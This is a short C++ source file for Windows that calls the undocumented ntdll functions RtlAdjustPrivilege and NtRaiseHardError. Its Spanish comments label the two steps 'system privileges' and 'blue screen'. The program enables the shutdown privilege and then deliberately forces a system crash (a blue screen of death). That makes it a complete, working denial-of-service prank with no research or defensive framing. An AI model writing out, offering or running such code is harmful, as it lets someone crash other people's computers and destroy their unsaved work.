#include <windows.h>

#pragma comment(lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG,BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG,ULONG,PULONG_PTR, ULONG,PULONG );

int main(){
    BOOLEAN bl = NULL;
    ULONG response;
    RtlAdjustPrivilege(19,true,false,&bl); // privilegios de sistema

    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0,0,0,6,&response); // pantalla azul
    return 0;
}